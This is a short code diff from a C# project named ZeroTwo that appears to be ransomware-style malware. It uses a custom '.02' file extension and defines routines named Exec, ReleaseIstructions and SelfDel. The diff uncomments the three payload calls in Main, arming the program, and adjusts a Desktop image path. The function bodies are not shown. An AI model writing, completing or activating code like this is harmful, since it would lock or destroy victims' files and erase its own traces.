@@ -9,14 +9,14 @@ namespace ZeroTwo.src {
         private const string EXT = ".02";
 
         public static void Main() {
-            //Exec();
-            //ReleaseIstructions();
-            //SelfDel();
+            Exec();
+            ReleaseIstructions();
+            SelfDel();
         }
 
         private static void OpenImage() {
             var imageRes = "ZeroTwo.src.ZeroTwo";
-            string imagePath = "C:/users/" + Environment.UserName + "/Desktop/ZeroTwo.jpg";
+            string imagePath = "C:/Users/" + Environment.UserName + "/Desktop/ZeroTwo.jpg";
 
             try {
                 if (File.Exists(imagePath))
